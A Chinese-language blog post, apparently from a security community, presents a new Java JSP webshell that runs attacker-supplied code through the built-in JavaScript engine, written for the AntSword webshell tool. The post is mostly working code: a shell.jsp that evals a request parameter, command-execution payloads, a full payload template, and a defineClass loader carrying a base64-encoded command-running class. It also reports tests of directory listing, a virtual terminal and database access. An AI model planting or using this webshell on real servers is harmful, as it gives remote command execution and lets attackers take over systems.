# 一种新型Java一句话木马的实现

<meta name="referrer" content="no-referrer" />


>本文首发于先知社区

## 前言

一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。

## 基本原理

1. Java没有eval函数，Js有eval函数，可以把字符串当代码解析。
2. Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。
3. ScriptEngine支持在Js中调用Java的对象。

综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。

ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。

如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？



在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。

### 获取脚本引擎

```
//通过脚本名称获取：
ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");  //简写为js也可以
//通过文件扩展名获取： 
ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");  
//通过MIME类型来获取： 
ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType("text/javascript");  
```

### 绑定对象

```
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
engine.put("request", request);
engine.put("response", response);
engine.eval(request.getParameter("mr6"));
```

或者通过eval的重载函数，直接把对象通过一个HashMap放进去

```
new javax.script.ScriptEngineManager().getEngineByName("js").eval(request.getParameter("ant"), new javax.script.SimpleBindings(new java.util.HashMap() {{
put("response", response);
put("request", request);
}}))
```

### eval

综合上面两步，有很多种写法，例如：

shell.jsp

```
<%

     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("js");
     engine.put("request", request);
     engine.put("response", response);
     engine.eval(request.getParameter("mr6"));

%>
```

或者直接缩写成一句：

```
<%
     new javax.script.ScriptEngineManager().getEngineByName("js").eval(request.getParameter("mr6"), new javax.script.SimpleBindings(new java.util.HashMap() {{
            put("response", response);
            put("request", request);
        }}));
%>
```

以执行命令为例：

POST：mr6=java.lang.Runtime.getRuntime().exec("calc");

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png)

即可达到命令执行的效果。



## 基本语法

翻阅文档比较枯燥，这里挑一些用到的说一说。

感兴趣的同学也可以看一下原文档：https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf

### 调用Java方法

前面加上全限定类名即可

```
var s = [3];
s[0] = "cmd";
s[1] = "/c";
s[2] = "whoami";//yzddmr6
var p = java.lang.Runtime.getRuntime().exec(s);
var sc = new java.util.Scanner(p.getInputStream(),"GBK").useDelimiter("\\A");
var result = sc.hasNext() ? sc.next() : "";
sc.close();
```

### 导入Java类型

```
var Vector = java.util.Vector;
var JFrame = Packages.javax.swing.JFrame;
 
 //这种写法仅仅支持Nashorn，Rhino并不支持
var Vector = Java.type("java.util.Vector")
var JFrame = Java.type("javax.swing.JFrame")
```

### 创建Java类型的数组

```
// Rhino
var Array = java.lang.reflect.Array
var intClass = java.lang.Integer.TYPE
var array = Array.newInstance(intClass, 8)

// Nashorn
var IntArray = Java.type("int[]")
var array = new IntArray(8)
```

### 导入Java类

默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。

这个时候大聪明Mozilla  Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。

- importClass 导入指定Java的类，现在推荐用Java.type
- importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter 



这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。



```
load("nashorn:mozilla_compat.js");

importClass(java.util.HashSet);
var set = new HashSet();

importPackage(java.util);
var list = new ArrayList();
```

在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。

```
// create JavaImporter with specific packages and classes to import

var SwingGui = new JavaImporter(javax.swing,
                            javax.swing.event,
                            javax.swing.border,
                            java.awt.event);
with (SwingGui) {
    // 在with里面才可以调用swing里面的类，防止污染
    var mybutton = new JButton("test");
    var myframe = new JFrame("test");
}
```

### 方法调用与重载

方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：

```
var System = Java.type('java.lang.System');
System.out.println('Hello, World');    // Hello, World
System.out['println']('Hello, World'); // Hello, World
```

Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：

```
var System = Java.type('java.lang.System');
System.out['println'](3.14);          // 3.14
System.out['println(double)'](3.14);  // 3.14
System.out['println(int)'](3.14);     // 3
```

## Payload结构设计

详情写在注释里了

```
//导入基础拓展
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
//导入常见包
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);

var output = new StringBuffer(""); //输出
var cs = "${jspencode}"; //设置字符集编码
var tag_s = "${tag_s}"; //开始符号
var tag_e = "${tag_e}"; //结束符号
try {
  response.setContentType("text/html");
  request.setCharacterEncoding(cs);
  response.setCharacterEncoding(cs);
  function decode(str) {
    //参数解码
    str = str.substr(2);
    var bt = Base64DecodeToByte(str);
    return new java.lang.String(bt, cs);
  }
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = Base64.getDecoder().decode(str);
    }
    return bt;
  }
  function asoutput(str) {
    //回显加密
    return str;
  }
  function func(z1) {
    //eval function

    return z1;
  }
  output.append(func(z1)); //添加功能函数回显
} catch (e) {
  output.append("ERROR:// " + e.toString()); //输出错误
}
try {
  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显
} catch (e) {}
```

## 语法问题的坑

### 两种语言对象间的相互转换

要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。

在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。

正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。

下面附上类型对比表：

| JavaScript Value   | JavaScript Type | Java Type                                  | Is Scriptable | Is Function |
| ------------------ | --------------- | ------------------------------------------ | ------------- | ----------- |
| {a:1, b:['x','y']} | object          | org.mozilla.javascript.NativeObject        | **+**         | -           |
| [1,2,3]            | object          | org.mozilla.javascript.NativeArray         | **+**         | -           |
| 1                  | number          | java.lang.Double                           | -             | -           |
| 1.2345             | number          | java.lang.Double                           | -             | -           |
| NaN                | number          | java.lang.Double                           | -             | -           |
| Infinity           | number          | java.lang.Double                           | -             | -           |
| -Infinity          | number          | java.lang.Double                           | -             | -           |
| true               | boolean         | java.lang.Boolean                          | -             | -           |
| "test"             | string          | java.lang.String                           | -             | -           |
| null               | object          | null                                       | -             | -           |
| undefined          | undefined       | org.mozilla.javascript.Undefined           | -             | -           |
| function () { }    | function        | org.mozilla.javascript.gen.c1              | **+**         | **+**       |
| /.*/               | object          | org.mozilla.javascript.regexp.NativeRegExp | **+**         | **+**       |

### Rhino/Nashorn解析的差异

这也是当时一个坑点，看下面一段代码

```
      var readonlyenv = System.getenv();
      var cmdenv = new java.util.HashMap(readonlyenv);
      var envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
      for (var i = 0; i < envs.length; i++) {
        var es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
        if (es.length == 2) {
          cmdenv.put(es[0], es[1]);
        }
      }
      var e = [];
      var i = 0;
      print(cmdenv+'\n');
      for (var key in cmdenv) {//关键
        print("key: "+key+"\n");
        e[i] = key + "=" + cmdenv[key];
        i++;
      }
```

其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png)

但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png)

所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。

解决办法使用Java迭代器即可，不掺杂js的写法。

```
    var i = 0;
    var iter = cmdenv.keySet().iterator();
    while (iter.hasNext()) {
      var key = iter.next();
      var val = cmdenv.get(key);
      //print("\nkey:" + key);
      //print("\nval:" + val);
      e[i] = key + "=" + val;
      i++;
    }
```

### 反射的坑

在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。



例如base64解码的时候，Java的写法如下

```
    public byte[] Base64DecodeToByte(String str) {
        byte[] bt = null;
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            } else {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            }
            return bt;
        } catch (Exception e) {
            return new byte[]{};
        }
    }
```

改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png)

```
function test(str) {
  var bt = null;
  var version = System.getProperty("java.version");

  if (version.compareTo("1.9") >= 0) {
    var clazz = java.lang.Class.forName("java.util.Base64");
    var decoder = clazz.getMethod("getDecoder").invoke(null);
    bt = decoder
      .getClass()
      .getMethod("decode", java.lang.String.class)
      .invoke(decoder, str);
  } else {
    var clazz = java.lang.Class.forName("sun.misc.BASE64Decoder");
    bt = clazz
      .getMethod("decodeBuffer", java.lang.String.class)
      .invoke(clazz.newInstance(), str);
  }
  return bt;
}
```

但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。

```
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = Base64.getDecoder().decode(str);
    }
    return bt;
  }
```

## 保底操作

理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。

我们可以用java调用js后，再调用defineClass来实现：

编写一个命令执行的类：calc.java

```
import java.io.IOException;

public class calc {
    public calc(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

编译之后base64一下

```
> base64 -w 0 calc.class
yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA
```

填入下方payload

```
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var output = new StringBuffer("");
var cs = "UTF-8";
response.setContentType("text/html");
request.setCharacterEncoding(cs);
response.setCharacterEncoding(cs);
function Base64DecodeToByte(str) {
  importPackage(Packages.sun.misc);
  importPackage(Packages.java.util);
  var bt;
  try {
    bt = new BASE64Decoder().decodeBuffer(str);
  } catch (e) {
    bt = new Base64().getDecoder().decode(str);
  }
  return bt;
}
function define(Classdata, cmd) {
  var classBytes = Base64DecodeToByte(Classdata);
  var byteArray = Java.type("byte[]");
  var int = Java.type("int");
  var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(
    "defineClass",
    byteArray.class,
    int.class,
    int.class
  );
  defineClassMethod.setAccessible(true);
  var cc = defineClassMethod.invoke(
    Thread.currentThread().getContextClassLoader(),
    classBytes,
    0,
    classBytes.length
  );
  return cc.getConstructor(java.lang.String.class).newInstance(cmd);
}
output.append(
  define(
    "yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==",
    "calc"
  )
);
response.getWriter().print(output);
```

成功弹出计算器

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png)

也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。

## 测试

测试环境：Java>=6

同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png)

列目录

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png)

中文测试

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png)

虚拟终端

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png)



数据库连接

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png)

## 最后

基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。

提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。

项目地址：

https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385

###  

###
